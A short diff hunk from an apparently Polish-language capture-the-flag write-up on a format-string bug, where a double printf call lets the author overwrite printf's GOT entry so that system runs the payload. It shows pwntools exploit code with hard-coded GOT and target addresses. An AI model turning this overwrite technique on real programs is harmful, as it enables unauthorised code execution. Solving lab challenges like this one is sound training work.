@@ -13,8 +13,10 @@ skoro mamy dwukrotnie funkcje printf dzięki której jesteśmy w stanie nadpisa�
 Zadziała to ponieważ argumentem funkcji system stanie się wtedy nasz payload.\
 kod:
 ```python
-io = process("./ancient_echoes")
+from pwn import process, fmtstr, ELF, context, args
 
+context.binary = ELF(args.EXE or './chall')
+io = process("./chall")
 printf_got = 0x404038
 admin_debug = 0x40121D
 
